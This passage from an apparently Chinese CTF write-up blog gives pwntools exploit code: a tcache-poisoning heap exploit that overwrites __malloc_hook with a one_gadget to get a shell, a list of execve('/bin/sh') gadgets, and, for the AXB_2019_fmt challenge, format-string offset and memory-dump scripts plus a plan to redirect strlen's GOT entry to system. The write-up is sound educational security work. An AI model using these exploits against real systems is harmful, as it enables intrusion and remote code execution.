ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>

<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">md</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 0</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 1</span>

    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leak heap addr</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x260</span>
    li<span class="token punctuation">(</span><span class="token string">'heap_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#ixx 2</span>
    md<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#modify as heap base</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 3</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 4</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x0700000000000000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># set as max num so free not as tcache bin</span>
    md<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#leak libc</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    lib<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x3ebc40</span>
    li<span class="token punctuation">(</span><span class="token string">'libc base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
    gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0xe569f</span><span class="token punctuation">,</span> <span class="token number">0xe5858</span><span class="token punctuation">,</span> <span class="token number">0xe585f</span><span class="token punctuation">,</span> <span class="token number">0xef863</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">,</span> <span class="token number">0x10a398</span><span class="token punctuation">]</span>
    one_gadget <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> gadget<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x0700000000000000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># set as max num so free not as tcache bin</span>
    p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>

    md<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 5</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
    md<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#get shell</span>
    <span class="token comment" spellcheck="true">#db()</span>
    ad<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span>



    <span class="token comment" spellcheck="true">## can't malloc only to modify _IO_2_1_stdout vtable</span>


<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp &amp; 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe569f execve("/bin/sh", r14, r12)
constraints:
  [r14] == NULL || r14 == NULL
  [r12] == NULL || r12 == NULL

0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe585f execve("/bin/sh", r10, [rbp-0x70])
constraints:
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe5863 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x10a398 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL
'''</span>
</code></pre>
<h1 id="AXB-2019-fmt"><a href="#AXB-2019-fmt" class="headerlink" title="AXB_2019_fmt"></a>AXB_2019_fmt</h1><h2 id="来源-7"><a href="#来源-7" class="headerlink" title="来源"></a>来源</h2><p>AXB_2019</p>
<h2 id="难度-6"><a href="#难度-6" class="headerlink" title="难度"></a>难度</h2><p>4/ 10</p>
<h2 id="简单描述-6"><a href="#简单描述-6" class="headerlink" title="简单描述"></a>简单描述</h2><p>不给elf文件, 盲打.</p>
<h2 id="vul-8"><a href="#vul-8" class="headerlink" title="vul"></a>vul</h2><pre class=" language-bash"><code class="language-bash">logan@LYXF:~/share/axb_fmt1$ nc node3.buuoj.cn 29458
Hello,I am a computer Repeater updated.
After a lot of machine learning,I know that the essence of <span class="token function">man</span> is a reread machine<span class="token operator">!</span>
So I'll answer whatever you say<span class="token operator">!</span>
Please tell me:%p %p
Repeater:0x804888d 0xffde142f

Please tell me:^c</code></pre>
<p>存在字符串漏洞, 输出4bytes的地址, 这是一个32位程序</p>
<h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><p>fmt vul的各种利用, fmt vul dump文件, fmt vul修改内存.</p>
<h2 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h2><p>先使用脚本算出偏移,然后编写dump脚本, 这是一个32 bit的程序,就从0x08048000开始dump内存然后写入本地文件中, 后面就简单得多了, 分析所dump的文件,发现strlen对字符串的长度进行判断, 采用字符串漏洞泄漏libc,随便找一个函数都行,计算偏移,然后再获取system函数, 修改strlen的got地址为system,再输入时输入’;/bin/sh’就行, 注意,因为strlen传入的时候, Repeater:也跟着传入, 在linux bash中以’; ‘来进行分割命令,所以相当于执行两次命令, 一个Repeater:和一个/bin/sh.</p>
<h2 id="利用-9"><a href="#利用-9" class="headerlink" title="利用"></a>利用</h2><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>这个是我自己写的一个跑偏移脚本, 十分方便,用手数…^_^</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

<span class="token comment" spellcheck="true">#exeFile  = "./4th-CyberEarth"</span>

remoteIp <span class="token operator">=</span> <span class="token string">"node3.buuoj.cn"</span>
remotePort <span class="token operator">=</span> <span class="token number">29619</span>

LOCAL <span class="token operator">=</span> <span class="token number">0</span>
maxLen <span class="token operator">=</span> <span class="token number">0x30</span>
minLen <span class="token operator">=</span> <span class="token number">0x10</span>
preSendStr <span class="token operator">=</span> <span class="token string">''</span>
recvStr <span class="token operator">=</span> <span class="token string">''</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>preSendStr <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        sla<span class="token punctuation">(</span>preSendStr<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>recvStr <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ru<span class="token punctuation">(</span>recvStr<span class="token punctuation">)</span>

    recv <span class="token operator">=</span> ra<span class="token punctuation">(</span><span class="token punctuation">)</span>
    infos <span class="token operator">=</span> recv<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">', '</span><span class="token punctuation">)</span>
    offset <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">for</span> info <span class="token keyword">in</span> infos<span class="token punctuation">:</span>
        li<span class="token punctuation">(</span>info<span class="token punctuation">)</span>
        offset <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'0x44434241'</span> <span class="token operator">==</span> info<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> offset    
    <span class="token comment" spellcheck="true">#pause()</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    payload <span class="token operator">=</span> <span class="token string">'ABCD'</span> <span class="token operator">+</span> <span class="token string">', %p'</span> <span class="token operator">*</span> minLen
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
            io <span class="token operator">=</span> process<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>    
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        offset <span class="token operator">=</span> calc<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">!=</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>
            li<span class="token punctuation">(</span><span class="token string">'---------------------------------------------'</span><span class="token punctuation">)</span>
            li<span class="token punctuation">(</span><span class="token string">'\noffset:'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    
            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        payload <span class="token operator">+=</span> <span class="token string">', %p'</span>    
        length <span class="token operator">+=</span> <span class="token number">1</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span>length <span class="token operator">></span> maxLen<span class="token punctuation">)</span><span class="token punctuation">:</span>
            li<span class="token punctuation">(</span><span class="token string">'---------------------------------------------'</span><span class="token punctuation">)</span>
            li<span class="token punctuation">(</span><span class="token string">'not found! maxLen too litile'</span><span class="token punctuation">)</span>
            io<span class="token punctuation">.</span>close
            <span class="token keyword">break</span>

</code></pre>
<p>跑的操作如下</p>
<pre><code>logan@LYXF:~/share/axb_fmt1$ python calc_fmt_offset.py 
[+] Opening connection to node3.buuoj.cn on port 29458: Done
[DEBUG] Sent 0x45 bytes:
    &#39;ABCD, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p\n&#39;
[-] Receiving all data: Failed
[DEBUG] Received 0x7b bytes:
    &#39;Hello,I am a computer Repeater updated.\n&#39;
    &#39;After a lot of machine learning,I know that the essence of man is a reread machine!&#39;
[DEBUG] Received 0x31 bytes:
    &#39;\n&#39;
    &quot;So I&#39;ll answer whatever you say!\n&quot;
    &#39;Please tell me:&#39;
[DEBUG] Received 0xc8 bytes:
    &#39;Repeater:ABCD, 0x804888d, 0xffe54d3f, 0xf7f5a53c, 0xffe54d48, 0xf7f365c5, 0x4f, 0x41e54e34, 0x2c444342, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520\n&#39;
    &#39;\n&#39;</code></pre>
<p>通过手数, 差一个字节偏移就为8 (0x41e54e34, 0x2c444342), 后面再利用的时候就要得补一字节对其.</p>
<h3 id="编写dump脚本"><a href="#编写dump脚本" class="headerlink" title="编写dump脚本"></a>编写dump脚本</h3><p>利用 printf 中的 %s来进行dump, ‘%’ + str(offset + x) + ‘$s’ + p32(target_addr)来调整所dump的参数位置, 这就可以dump出任何内存的值了, 我们知道, linux32位程序,若没有开启pie的话,elf文件就加载到0x08048000起始位置, linux 64位程序就加载到0x400000位置, 所以我们就从0x08048000位置开始dump, 注意 dump出来的数据是以’\x00’结尾的, 每一条数据后面都要加一条‘\x00’,dump为空的也数据也就为 ‘\x00’,循环dump数据,写入文件, 我也是第一次写dump文件,照着ctf-wiki中那个方法, dump感觉太慢了,每次都要重新连接,而这个体是循环输入的,不用每次dump都重新连接,还有,dump的时候,无误了,尽量把IO输出给删了, 极大影响dump的速率,尽最大的关掉, 还有在打远程的时候总是容易断开,如下:</p>
<pre><code>[*] dumping: 1660/12288
[*] dumping: 2010/12288
[*] dumping: 2140/12288
[*] dumping: 2270/12288
[*] dumping: 2280/12288
[*] dumping: 2310/12288
[*] dumping: 2320/12288
[*] dumping: 2380/12288
[*] dumping: 2390/12288
[*] dumping: 2460/12288
[*] Error.</code></pre>
<p>这就导致dump的数据太少了, 我就改进了一下,添加一个重新连接,继续dump.改进后如下:</p>
<pre><code>[*] dumping: 2540/12288
[*] Closed connection to node3.buuoj.cn port 29458
[*] Error.
[+] Opening connection to node3.buuoj.cn on port 29458: Done
[*] dumping: 2550/12288
[*] dumping: 2560/12288
</code></pre>
<h5 id="dump-文件脚本"><a href="#dump-文件脚本" class="headerlink" title="dump 文件脚本"></a>dump 文件脚本</h5><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token triple-quoted-string string">'''
This is a dump file script
'''</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>

exeFile <span class="token operator">=</span> <span class="token string">''</span>
libFile <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"node3.buuoj.cn"</span>
remotePort <span class="token operator">=</span> <span class="token number">29458</span>

LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIB   <span class="token operator">=</span> <span class="token number">0</span>

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>

offset <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span>

<span class="token keyword">def</span> <span class="token function">getbinary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data_length <span class="token operator">=</span> <span class="token number">0x3000</span> <span class="token comment" spellcheck="true">#想要获取数据的长度.</span>
    base_addr <span class="token operator">=</span> <span class="token number">0x08048000</span> <span class="token comment" spellcheck="true"># 起始地址</span>
    end_addr  <span class="token operator">=</span> base_addr <span class="token operator">+</span> data_length <span class="token comment" spellcheck="true"># 结束地址</span>
    f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'binary'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
    addr <span class="token operator">=</span> base_addr
    isDisConnect <span class="token operator">=</span> <span class="token boolean">False</span>
    disConnectMaxTimes <span class="token operator">=</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">#这里可以设定一个最大断开连接次数,网络差就调大一点</span>

    io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>disConnectMaxTimes<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please tell me:'</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> addr <span class="token operator">&lt;</span> end_addr<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                p <span class="token operator">=</span> <span class="token string">'ABCDE'</span> <span class="token comment" spellcheck="true">#随便一些自己规定的字符,从这里开始读取数据</span>
                p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
                p <span class="token operator">+=</span> <span class="token string">'$s'</span>
                p <span class="token operator">+=</span> <span class="token string">'CBAABCD'</span> <span class="token comment" spellcheck="true">#随便一些自己规定的字符,方便结尾,中间的数据就是dump的数据了</span>
                p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
                io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
                io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ABCDE'</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
                data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'CBAABCD'</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
                <span class="token comment" spellcheck="true">#print data</span>
            <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#读有错误的话,就断开重新连接</span>
                isDisconnect <span class="token operator">=</span> <span class="token boolean">True</span>
                io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
